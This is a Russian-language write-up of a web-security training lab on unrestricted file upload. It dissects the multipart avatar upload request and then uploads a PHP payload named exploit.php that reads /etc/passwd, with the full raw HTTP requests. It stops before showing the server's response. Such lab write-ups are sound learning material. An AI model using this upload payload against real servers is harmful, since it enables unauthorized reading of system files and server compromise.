## Дано

учётка `wiener:peter`

## Задача

через загрузку файлов узнать секрет `/home/carlos/secret`

# Разведка

Запрос при отправке изображения
```
POST /my-account/avatar HTTP/2
Host: 0a31003e04566e79802e8fb8000f0037.web-security-academy.net
Cookie: session=FHvyuqNxNXt3Y0Zzlab7LBg5qD5C8pRu
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=---------------------------28702491387431376323818209528
Content-Length: 9291
Origin: https://0a31003e04566e79802e8fb8000f0037.web-security-academy.net
Referer: https://0a31003e04566e79802e8fb8000f0037.web-security-academy.net/my-account
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Sec-Gpc: 1
Priority: u=0, i
Te: trailers

-----------------------------28702491387431376323818209528
Content-Disposition: form-data; name="avatar"; filename="icons8-google-chrome-200.png"
Content-Type: image/png

PNG
[...binary content of example.jpg...]
```

Формат `Content-Type: multipart/form-data; boundary=---------------------------28702491387431376323818209528`

Ответ (увидеть можно ток при настройках фильтров images в burp suit)
```
GET /files/avatars/icons8-google-chrome-200.png HTTP/2
Host: 0a31003e04566e79802e8fb8000f0037.web-security-academy.net
Cookie: session=FHvyuqNxNXt3Y0Zzlab7LBg5qD5C8pRu
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: image/avif,image/webp,image/png,image/svg+xml,image/*;q=0.8,*/*;q=0.5
Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br
Referer: https://0a31003e04566e79802e8fb8000f0037.web-security-academy.net/my-account
Sec-Fetch-Dest: image
Sec-Fetch-Mode: no-cors
Sec-Fetch-Site: same-origin
Sec-Gpc: 1
Priority: u=5, i
Te: trailers
```
Ответ от сервера содержит кодировку в png как мы и отослали в POST

### Разбор запроса

Убрав изображение мы видим
```
-----------------------------28702491387431376323818209528
Content-Disposition: form-data; name="avatar"; filename="icons8-google-chrome-200.png"
Content-Type: image/png

-----------------------------28702491387431376323818209528
Content-Disposition: form-data; name="user"

wiener
-----------------------------28702491387431376323818209528
Content-Disposition: form-data; name="csrf"

XhAIqFUP078hvMj404up8KXXNDNsweZz
-----------------------------28702491387431376323818209528--
```

##### 1. Границы (Boundary):

   • `-----------------------------28702491387431376323818209528` — это граница (boundary), которая используется для разделения различных частей данных в запросе. Она уникальна для данного запроса и позволяет серверу понимать, где заканчивается одна часть и начинается другая.

##### 2. Части данных:

Каждая часть данных начинается с границы и содержит заголовки и тело. В вашем примере есть три части:

**• Первая часть: Загружаемое изображение.**
 
```
Content-Disposition: form-data; name="avatar"; filename="icons8-google-chrome-200.png"
Content-Type: image/png
```
  
- Content-Disposition: указывает, что это часть формы с именем avatar, и что это файл с именем icons8-google-chrome-200.png.
- Content-Type: указывает тип содержимого, в данном случае это PNG-изображение.

**• Вторая часть: Дополнительные данные формы.**

```
Content-Disposition: form-data; name="user" 

wiener
```
Здесь передается текстовое поле с именем user, в котором содержится значение wiener.

**• Третья часть: CSRF-токен.**
 
Content-Disposition: form-data; name="csrf"

 XhAIqFUP078hvMj404up8KXXNDNsweZz

Это поле предназначено для защиты от атак CSRF (Cross-Site Request Forgery) и содержит токен, который сервер может проверить.

##### 3. Завершение:

   • Запрос завершается границей, которая заканчивается двойным дефисом (--):
 
 `-----------------------------28702491387431376323818209528--`

# Атака

Убираем кодированное изображение и вставляем на его место
```
<?php echo file_get_contents('/etc/passwd'); ?>
```

Получаем формат POST
```
POST /my-account/avatar HTTP/2
Host: 0a31003e04566e79802e8fb8000f0037.web-security-academy.net
Cookie: session=FHvyuqNxNXt3Y0Zzlab7LBg5qD5C8pRu
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=---------------------------28702491387431376323818209528
Content-Length: 9291
Origin: https://0a31003e04566e79802e8fb8000f0037.web-security-academy.net
Referer: https://0a31003e04566e79802e8fb8000f0037.web-security-academy.net/my-account
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Sec-Gpc: 1
Priority: u=0, i
Te: trailers

-----------------------------28702491387431376323818209528
Content-Disposition: form-data; name="avatar"; filename="exploit.php"
Content-Type: image/png

<?php echo file_get_contents('/etc/passwd'); ?>
-----------------------------28702491387431376323818209528
Content-Disposition: form-data; name="user"

wiener
-----------------------------28702491387431376323818209528
Content-Disposition: form-data; name="csrf"

XhAIqFUP078hvMj404up8KXXNDNsweZz
-----------------------------28702491387431376323818209528--
```
После отправляем
```
GET /files/avatars/exploit.php HTTP/2
Host: 0a5500a704e2293481f998a800dd00a6.web-security-academy.net
Cookie: session=l1SIvBcF6l20ZMIck9OPGKMiA6IcaZPA
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: image/avif,image/webp,image/png,image/svg+xml,image/*;q=0.8,*/*;q=0.5
Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br
Referer: https://0a5500a704e2293481f998a800dd00a6.web-security-academy.net/my-account
Sec-Fetch-Dest: image
Sec-Fetch-Mode: no-cors
Sec-Fetch-Site: same-origin
Sec-Gpc: 1
Priority: u=5, i
Te: trailers
Content-Length: 4
```
И  получаем ответ
